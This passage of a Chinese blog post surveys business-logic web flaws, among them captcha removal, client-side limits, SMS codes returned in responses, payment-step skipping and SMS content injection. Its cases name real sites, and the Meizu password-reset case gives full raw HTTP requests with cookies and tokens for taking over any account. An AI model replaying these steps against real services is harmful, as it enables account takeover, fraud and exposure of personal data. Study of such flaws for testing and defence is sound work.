+<p>并可以购买：<img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416174833783.png" alt="image-20200416174833783"></p>
+<h4 id="3-6-认证凭证空值绕过："><a href="#3-6-认证凭证空值绕过：" class="headerlink" title="3.6 认证凭证空值绕过："></a>3.6 认证凭证空值绕过：</h4><p>在某系统找回密码界面输入信息：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416174930933.png" alt="image-20200416174930933"></p>
+<p>随便填验证码：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416175009638.png" alt="image-20200416175009638"></p>
+<p>抓包：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416175023388.png" alt="image-20200416175023388"></p>
+<p>将验证码字段去掉：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416175042189.png" alt="image-20200416175042189"></p>
+<p>成功：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416175050116.png" alt="image-20200416175050116"></p>
+<h4 id="3-7-response校验不合规"><a href="#3-7-response校验不合规" class="headerlink" title="3.7 response校验不合规"></a>3.7 response校验不合规</h4><p>在有些系统仅仅前端对response包进行校验，如果修改response包将失败包改为成功包可以绕过。</p>
+<h3 id="4-业务数据串改"><a href="#4-业务数据串改" class="headerlink" title="4.业务数据串改"></a>4.业务数据串改</h3><h4 id="4-1-最大数限制突破"><a href="#4-1-最大数限制突破" class="headerlink" title="4.1 最大数限制突破"></a>4.1 最大数限制突破</h4><p>很多商品限制用户购买数量时，服务器仅在页面通过js脚本限制，未在服务器端校验用户提交的数量，通过抓包修改商品最大数限制，将请求中的商品数量改为大于最大数限制的值，查看能否以修改后的数量完成业务流程。</p>
+<h4 id="4-2-本地js参数修改"><a href="#4-2-本地js参数修改" class="headerlink" title="4.2 本地js参数修改"></a>4.2 本地js参数修改</h4><p>部分应用程序通过Javascript处理用户提交的请求，通过修改Javascript脚本，测试修改后的数据是否影响到用户。</p>
+<h3 id="5-返回短信验证码"><a href="#5-返回短信验证码" class="headerlink" title="5.返回短信验证码"></a>5.返回短信验证码</h3><p>案例：新浪某站任意用户密码修改（验证码与取回逻辑设计不当）</p>
+<p>新浪某站任意用户密码修改，影响大量用户。</p>
+<p>问题网站<a href="http://esf.sina.com.cn/" target="_blank" rel="noopener">http://esf.sina.com.cn/</a> 【新浪二手房】</p>
+<p>在主站登录处点击登录</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413181205291.png" alt="image-20200413181205291"></p>
+<p>随机点击忘记密码：</p>
+<p>在<a href="http://broker.esf.sina.com.cn/login/findpassword" target="_blank" rel="noopener">http://broker.esf.sina.com.cn/login/findpassword</a> 界面输入用户名时抓包</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413181236739.png" alt="image-20200413181236739"></p>
+<p>可以看到返回数据中含有该用户的手机号</p>
+<p>通过解密，得到此用户shenzhen的手机号为182****7672</p>
+<p>在密码找回处输入解密后的手机号，并点发送验证码。再次抓包</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413181303342.png" alt="image-20200413181303342"></p>
+<p>可见短信验证码加密后返回给了浏览器，我们解密。得出验证码为234589。</p>
+<p>成功重置密码</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413181326212.png" alt="image-20200413181326212"></p>
+<h3 id="6-Token设计不合理相关漏洞"><a href="#6-Token设计不合理相关漏洞" class="headerlink" title="6. Token设计不合理相关漏洞"></a>6. Token设计不合理相关漏洞</h3><p>案例：身份通任意密码修改-泄漏大量公民信息</p>
+<p>通过忘记密码，使用邮箱找回密码：</p>
+<p><a href="http://www.idtag.cn/regionTempAction.do?method=toForwardFindPasswordStyle" target="_blank" rel="noopener">http://www.idtag.cn/regionTempAction.do?method=toForwardFindPasswordStyle</a></p>
+<p>使用真实信息找回密码后.会发送一封邮件到邮箱.</p>
+<p>邮箱中得到如下链接</p>
+<p><a href="http://www.idtag.cn/regionTempAction.do?method=resetPassword&amp;idtagCard=用户ID值&amp;authcode=Go8K7yp4TWy&amp;rtEmail=邮箱地址" target="_blank" rel="noopener">http://www.idtag.cn/regionTempAction.do?method=resetPassword&amp;idtagCard=用户ID值&amp;authcode=Go8K7yp4TWy&amp;rtEmail=邮箱地址</a></p>
+<p>访问后可直接重置用户密码.</p>
+<p>输入新密码后提交时抓包.</p>
+<p>获得以下内容 ：</p>
+<p>org.apache.struts.taglib.html.TOKEN=83accc27d5178f832d9f22a1d02bdacf&amp;org.apache.struts.taglib.html.TOKEN=83accc27d5178f</p>
+<p>虽然有TOKEN…但是依然可以直接修改用户ID进行修改密码…</p>
+<p>随便修改了一个用户ID提交后得到如下信息。</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200414105247904.png" alt="image-20200414105247904"></p>
+<p>然后使用该用户ID进行登陆</p>
+<p>登陆成功</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200414105310762.png" alt="image-20200414105310762"></p>
+<p>可以查看到他的身份证照片信息</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200414105326037.png" alt="image-20200414105326037"></p>
+<p>案例：魅族的账号系统内存在漏洞可导致任意账户的密码重置</p>
+<p>原因是密码重置模块令牌的验证不严造成。</p>
+<p>首先进入这里，魅族的密码重置模块</p>
+<p><a href="https://member.meizu.com/forgetpwd" target="_blank" rel="noopener">https://member.meizu.com/forgetpwd</a></p>
+<p>然后我们需要获取的是四种功能模块的包，分别是发送验证码，验证验证码是否正确的，以及获取令牌和重置密码的，这里我都获取好了，接下来我们直接用</p>
+<p>发送验证码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST https://member.meizu.com/uc/system/vcode/sendEmailVcode HTTP/1.1</span><br><span class="line">Host: member.meizu.com</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 64</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Origin: https://member.meizu.com</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 SE 2.X MetaSr 1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Referer: https://member.meizu.com/uc/system/webjsp/forgetpwd/toMail?account=××××××××××××</span><br><span class="line">Accept-Encoding: gzip,deflate,sdch</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Cookie: _fgpwdtk=AXTK4CkEUfVC_C1NDGumKyOL6r_8-5kM3oRskFNFuOjRX8Z-WKSowkbe1MkEq6uNUEqtX9fxR9wgFq9bOoEi73xsAVRurOfKThdEJiZEEeQ0ELOzCuIMJlm9YMpMQhdcQT8xwDBBRtV7z08WGayOKv0HJszxDvS3s0F0Zdx9-QM*7MF-nQFGcjtSDNYJejrxOkDzzkQ5FE3WbW0o7UoYJw5GNswWeGpzqQCFbdxcT_rLeVU4_l_MIS2c8C_NpSiowUz7LMNB3RG5mmu3InK7R9qAfPpI4Cb5hMh5Ynq13Vv11y46d4LW-AaGqon48D06CA; JSESSIONID=m11ira64bg3rb4n5u6oi1oln46m</span><br><span class="line">email=glzjin%40zhaojin97.cn&amp;vCodeTypeValue=8&amp;account=××××××××××××</span><br></pre></td></tr></table></figure>
+
+<p>验证验证码是否正确：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST https://member.meizu.com/uc/system/vcode/isValidEmailVCodeForForgetPwd HTTP/1.1</span><br><span class="line">Host: member.meizu.com</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 77</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Origin: https://member.meizu.com</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 SE 2.X MetaSr 1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Referer: https://member.meizu.com/uc/system/webjsp/forgetpwd/toMail?account=×××××××××××</span><br><span class="line">Accept-Encoding: gzip,deflate,sdch</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Cookie: _fgpwdtk=AXTK4CkEUfVC_C1NDGumKyOL6r_8-5kM3oRskFNFuOjRX8Z-WKSowkbe1MkEq6uNUEqtX9fxR9wgFq9bOoEi73xsAVRurOfKThdEJiZEEeQ0ELOzCuIMJlm9YMpMQhdcQT8xwDBBRtV7z08WGayOKv0HJszxDvS3s0F0Zdx9-QM*7MF-nQFGcjtSDNYJejrxOkDzzkQ5FE3WbW0o7UoYJw5GNswWeGpzqQCFbdxcT_rLeVU4_l_MIS2c8C_NpSiowUz7LMNB3RG5mmu3InK7R9qAfPpI4Cb5hMh5Ynq13Vv11y46d4LW-AaGqon48D06CA; JSESSIONID=m11ira64bg3rb4n5u6oi1oln46m</span><br><span class="line">account=×××××××××××&amp;vCodeTypeValue=8&amp;email=glzjin%40zhaojin97.cn&amp;vcode=707054</span><br></pre></td></tr></table></figure>
+
+<p>获取令牌：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST https://member.meizu.com/security/resubmit/token/get HTTP/1.1</span><br><span class="line">Host: member.meizu.com</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 0</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Origin: https://member.meizu.com</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 SE 2.X MetaSr 1.0</span><br><span class="line">Referer: https://member.meizu.com/uc/system/webjsp/forgetpwd/toResetPwd?account=×××××××××××</span><br><span class="line">Accept-Encoding: gzip,deflate,sdch</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Cookie: JSESSIONID=m11ira64bg3rb4n5u6oi1oln46m; _fgpwdtk=PUF6F7bafqhWDa7pLRN-9G8pLVkM-ZOBb4lWiGtpuE7mpSGuCe0xElXwO059Ix2M35TSAUSgLDa2ZjDCKav3_hBcJObQo4580cuHuVw9nYOxsLJzyqRR5Tuoqmf0cEYG0TstMaLoTDOl4IqMOf3epsmhdjWMBKQCaZscRQa0xfs*7MF-nQFGcjtSDNYJejrxOkDzzkQ5FE3WbW0o7UoYJw4n6yE2ipq2dz-CtbX82Vj0Oad4x92et5f9vMdPm4hHI8jUZhujmD1YhvTHdQwnP583IuC0_lbQ23FJm0i5vQhRky9fCc0moGahkWAVTl_MXA</span><br></pre></td></tr></table></figure>
+
+<p>重置密码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST https://member.meizu.com/uc/system/webjsp/forgetpwd/resetPwd HTTP/1.1</span><br><span class="line">Host: member.meizu.com</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 125</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Origin: https://member.meizu.com</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 SE 2.X MetaSr 1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Referer: https://member.meizu.com/uc/system/webjsp/forgetpwd/toResetPwd?account=×××××××××××</span><br><span class="line">Accept-Encoding: gzip,deflate,sdch</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Cookie: _fgpwdtk=PUF6F7bafqhWDa7pLRN-9G8pLVkM-ZOBb4lWiGtpuE7mpSGuCe0xElXwO059Ix2M35TSAUSgLDa2ZjDCKav3_hBcJObQo4580cuHuVw9nYOxsLJzyqRR5Tuoqmf0cEYG0TstMaLoTDOl4IqMOf3epsmhdjWMBKQCaZscRQa0xfs*7MF-nQFGcjtSDNYJejrxOkDzzkQ5FE3WbW0o7UoYJw4n6yE2ipq2dz-CtbX82Vj0Oad4x92et5f9vMdPm4hHI8jUZhujmD1YhvTHdQwnP583IuC0_lbQ23FJm0i5vQhRky9fCc0moGahkWAVTl_MXA; JSESSIONID=m11ira64bg3rb4n5u6oi1oln46m</span><br><span class="line">form_resubmit_token_key=KH001S0NAMJE0HFNWTS2WNBTKDP57QVL&amp;account=×××××××××××&amp;resetPassword=laofuck&amp;repeatPassword=laofuck</span><br></pre></td></tr></table></figure>
+
+<p>接下来进行验证：</p>
+<p>1.首先准备一个测试账号：130××××××××</p>
+<p>2.同样的我们进入那个账号查找页面，然后这样把账号填进去，进到这个页面</p>
+<p>3.这时我们回到抓包那里，把COOKIE干出来</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: Hm_lvt_2a0c04774115b182994cfcacf4c122e9=1412300296; Hm_lpvt_2a0c04774115b182994cfcacf4c122e9=1412300296; _ga=GA1.2.1012289249.1412</span><br></pre></td></tr></table></figure>
+
+<p>这里我们需要的是这一段</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JSESSIONID=m2cpjjkteivjxr1o9d646pcjgqs; _fgpwdtk=IuqfrXg2_z8GS2MV_eygPBPmC9phjbeIXUN01pHJz9zZGJkpRVduU7C95ufFwA9ce74hsTcsVI5aFdPKFXybfuBLnMQhZexixy2DxKvH0vIfwUeNTMVG3B3WZYfU1zbUZQPCV8aiLEh5yknycRLk2WbZMHkBL_x8Kz9iOb_pTcg*LKCpR-u2ekV3g8T9J7RVH6boDmDf_gHX1mOAEgJGgrAOiU4TVsjo-XvT2pEJ9PEC9R-80fnDs0kVLl7q9ZzXn6C0HkxUhP_erM2SGTJTck8iolS2tpXnVqnKPIxL1uTCdqik0LttUUwwUCEPKria-Ig0mWTbbTgWiolnJedESMI</span><br></pre></td></tr></table></figure>
+
+<p>4.再拿出我们之前抓的找回密码那个包，我们替换些信息进去</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST https://member.meizu.com/uc/system/vcode/sendEmailVcode HTTP/1.1</span><br><span class="line">Host: member.meizu.com</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 64</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Origin: https://member.meizu.com</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 SE 2.X MetaSr 1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Referer: https://member.meizu.com/uc/system/webjsp/forgetpwd/toMail?account=15977441670</span><br><span class="line">Accept-Encoding: gzip,deflate,sdch</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Cookie:  JSESSIONID=m2cpjjkteivjxr1o9d646pcjgqs; _fgpwdtk=IuqfrXg2_z8GS2MV_eygPBPmC9phjbeIXUN01pHJz9zZGJkpRVduU7C95ufFwA9ce74hsTcsVI5aFdPKFXybfuBLnMQhZexixy2DxKvH0vIfwUeNTMVG3B3WZYfU1zbUZQPCV8aiLEh5yknycRLk2WbZMHkBL_x8Kz9iOb_pTcg*LKCpR-u2ekV3g8T9J7RVH6boDmDf_gHX1mOAEgJGgrAOiU4TVsjo-XvT2pEJ9PEC9R-80fnDs0kVLl7q9ZzXn6C0HkxUhP_erM2SGTJTck8iolS2tpXnVqnKPIxL1uTCdqik0LttUUwwUCEPKria-Ig0mWTbbTgWiolnJedESMI</span><br><span class="line">email=glzjin%40126.com&amp;vCodeTypeValue=8&amp;account=130‘********</span><br></pre></td></tr></table></figure>
+
+<p>注意，我这里替换的是COOKIE以及下面的账号那里，邮箱你要填上自己的</p>
+<p>然后，就发送出去吧</p>
+<p>5.然后我们的邮箱里收到了这封东西</p>
+<p>130×××××××，您好：</p>
+<p>感谢您使用Flyme服务。</p>
+<p>您正在进行Flyme找回密码操作，请在30分钟内将此验证码：991344 输入验证码输入框，以完成验证。</p>
+<p>此致</p>
+<p>Flyme 项目组</p>
+<p>把上面的验证码记下，我们继续玩</p>
+<p>6.然后这里，我们来验证一下是否正确，同样的记住替换COOKIE和信息</p>
+<p>验证验证码是否正确：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST https://member.meizu.com/uc/system/vcode/isValidEmailVCodeForForgetPwd HTTP/1.1</span><br><span class="line">Host: member.meizu.com</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 77</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Origin: https://member.meizu.com</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 SE 2.X MetaSr 1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Referer: https://member.meizu.com/uc/system/webjsp/forgetpwd/toMail?account=×××××××××××</span><br><span class="line">Accept-Encoding: gzip,deflate,sdch</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Cookie:  JSESSIONID=m2cpjjkteivjxr1o9d646pcjgqs; _fgpwdtk=IuqfrXg2_z8GS2MV_eygPBPmC9phjbeIXUN01pHJz9zZGJkpRVduU7C95ufFwA9ce74hsTcsVI5aFdPKFXybfuBLnMQhZexixy2DxKvH0vIfwUeNTMVG3B3WZYfU1zbUZQPCV8aiLEh5yknycRLk2WbZMHkBL_x8Kz9iOb_pTcg*LKCpR-u2ekV3g8T9J7RVH6boDmDf_gHX1mOAEgJGgrAOiU4TVsjo-XvT2pEJ9PEC9R-80fnDs0kVLl7q9ZzXn6C0HkxUhP_erM2SGTJTck8iolS2tpXnVqnKPIxL1uTCdqik0LttUUwwUCEPKria-Ig0mWTbbTgWiolnJedESMI</span><br><span class="line">account=130××××××××&amp;vCodeTypeValue=8&amp;email=glzjin%40zhaojin97.cn&amp;vcode=991344</span><br></pre></td></tr></table></figure>
+
+<p>返回是错误的，但不要在意，我们继续走</p>
+<p>7.这时，我们来获取令牌了，记得把该替换的东西都替换了</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST https://member.meizu.com/security/resubmit/token/get HTTP/1.1</span><br><span class="line">Host: member.meizu.com</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 0</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Origin: https://member.meizu.com</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 SE 2.X MetaSr 1.0</span><br><span class="line">Referer: https://member.meizu.com/uc/system/webjsp/forgetpwd/toResetPwd?account=130×××××××</span><br><span class="line">Accept-Encoding: gzip,deflate,sdch</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Cookie:  JSESSIONID=m2cpjjkteivjxr1o9d646pcjgqs; _fgpwdtk=IuqfrXg2_z8GS2MV_eygPBPmC9phjbeIXUN01pHJz9zZGJkpRVduU7C95ufFwA9ce74hsT</span><br></pre></td></tr></table></figure>
+
+<p>返回的是这些:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;"code":"200","message":"","redirect":"","value":"JUG2VL7VKRDDZ156UZSXQ92TIOFWUY0L"&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们需要的是value</p>
+<p>8.然后，最后，我们替换好该替换的东西，重置密码吧！</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST https://member.meizu.com/uc/system/webjsp/forgetpwd/resetPwd HTTP/1.1</span><br><span class="line">Host: member.meizu.com</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 125</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Origin: https://member.meizu.com</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 SE 2.X MetaSr 1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Referer: https://member.meizu.com/uc/system/webjsp/forgetpwd/toResetPwd?account=130×××××××</span><br><span class="line">Accept-Encoding: gzip,deflate,sdch</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Cookie:  JSESSIONID=m2cpjjkteivjxr1o9d646pcjgqs; _fgpwdtk=IuqfrXg2_z8GS2MV_eygPBPmC9phjbeIXUN01pHJz9zZGJkpRVduU7C95ufFwA9ce74hsTcsVI5aFdPKFXybfuBLnMQhZexixy2DxKvH0vIfwUeNTMVG3B3WZYfU1zbUZQPCV8aiLEh5yknycRLk2WbZMHkBL_x8Kz9iOb_pTcg*LKCpR-u2ekV3g8T9J7RVH6boDmDf_gHX1mOAEgJGgrAOiU4TVsjo-XvT2pEJ9PEC9R-80fnDs0kVLl7q9ZzXn6C0HkxUhP_erM2SGTJTck8iolS2tpXnVqnKPIxL1uTCdqik0LttUUwwUCEPKria-Ig0mWTbbTgWiolnJedESMI</span><br><span class="line">form_resubmit_token_key=JUG2VL7VKRDDZ156UZSXQ92TIOFWUY0L&amp;account=130×××××××&amp;resetPassword=xibaxiba&amp;repeatPassword=xibaxiba</span><br></pre></td></tr></table></figure>
+
+<p>OK，我们看到的，返回的是200和true,就是说我们成功的重置了密码.</p>
+<h3 id="7-业务流程乱序-顺序执行缺陷"><a href="#7-业务流程乱序-顺序执行缺陷" class="headerlink" title="7.业务流程乱序-顺序执行缺陷"></a>7.业务流程乱序-顺序执行缺陷</h3><p>1.首先部分网站的逻辑可能是A-B-C-D的顺序。</p>
+<p>2.用户控制着他们给应用程序发送的每一个请求，因此能够按照任何顺序进行访问。于是，用户就从B直接进入了D过程，就绕过了C。如果C是支付过程，那么用户就绕过了支付过程而买到了一件商品。如果C是验证过程，就会绕过验证直接进入网站程序了。</p>
+<p>案例：海棠秀 <a href="http://mp.haitangshow.com/" target="_blank" rel="noopener">http://mp.haitangshow.com/</a></p>
+<p>注册账号进行【选座购票】</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416162321809.png" alt="image-20200416162321809"></p>
+<p>然后点击【订票】、这里没我们要关心的，最后来到信息确认页面：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416162551249.png" alt="image-20200416162551249"></p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416162603403.png" alt="image-20200416162603403"></p>
+<p>直接跳过了支付宝支付页面，给出了取票密码</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416162619418.png" alt="image-20200416162619418"></p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416162631794.png" alt="image-20200416162631794"></p>
+<h3 id="8-内容编辑"><a href="#8-内容编辑" class="headerlink" title="8.内容编辑"></a>8.内容编辑</h3><p>在点击“获取短信验证码”，并抓取数据包内容，如下图。通过分析数据包，可以发现参数sendData/insrotxt的内容有客户端控制，可以修改为攻击者想要发送的内容：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416163918060.png" alt="image-20200416163918060"></p>
+<p>将内容修改“恭喜你获得由xx银行所提供的iphone6一部，请登录<a href="http://www.xxx.com领取，验证码为236694”并发送该数据包，手机可收到修改后的短信内容，如下图：" target="_blank" rel="noopener">http://www.xxx.com领取，验证码为236694”并发送该数据包，手机可收到修改后的短信内容，如下图：</a></p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416164136056.png" alt="image-20200416164136056"></p>
+<h3 id="9-时效绕过漏洞"><a href="#9-时效绕过漏洞" class="headerlink" title="9. 时效绕过漏洞"></a>9. 时效绕过漏洞</h3><p>大多有利用的案例发生在验证码以及业务数据的时效范围上，在之前的总结也有人将12306的作为典型，故，单独分类。</p>
+<h5 id="时间刷新缺陷："><a href="#时间刷新缺陷：" class="headerlink" title="时间刷新缺陷："></a>时间刷新缺陷：</h5><p>12306网站的买票业务是每隔5s，票会刷新一次。但是这个时间确实在本地设置的间隔。于是，在控制台就可以将这个时间的关联变量重新设置成1s或者更小，这样刷新的时间就会大幅度缩短（主要更改autoSearchTime本地参数）。</p>
+<p>案例：<a href="http://www.wooyun.org/bugs/wooyun-2014-048391" target="_blank" rel="noopener">12306自动刷票时间可更改漏洞</a></p>
+<p>12306的自动查询可以直接修改查询间隔时间，可使查询间隔时间无限小。</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416165224970.png" alt="image-20200416165224970"></p>
+<p>我们都知道，12306的订票现在可以开启“自动查询”，这时会5秒查一次，如果同时选了“自动提交”，那么如果查到票就会自动提交订单。好像挺方便的。<br> 查询间隔是5秒。估计是为了服务器考虑吧。</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416165242529.png" alt="image-20200416165242529"></p>
+<p>但如果修改autoSearchTime参数，查询间隔就随便改啦。<br> 打开console，输入想使用的自动查询间隔（毫秒）<br> 比如：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416165312834.png" alt="image-20200416165312834"></p>
+<p>然后再按原操作进行自动查询：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416165345951.png" alt="image-20200416165345951"></p>
+<p>我想多久查一次多久查一次，并且的确是可以按照这个时间提交订单的，yeah。<br> 这样一来，码农们刷票和提交定单就可以比大家快5秒啦，达到0.01秒。</p>
+<h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><p>《web漏洞挖掘》作者不详。相关图片多来自于乌云知识库。</p>
+<p>《Web渗透测试之逻辑漏洞挖掘》hackbar</p>
+
+      
+    </div>
+    
+    
+    
+
+
+<div>
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束 <i class="fa fa-heart"></i> 感谢阅读-------------</div>
+    
+</div>
+</div>
+ 
+
+    
+
+    
+
+    
+
+
+
+    <footer class="post-footer">
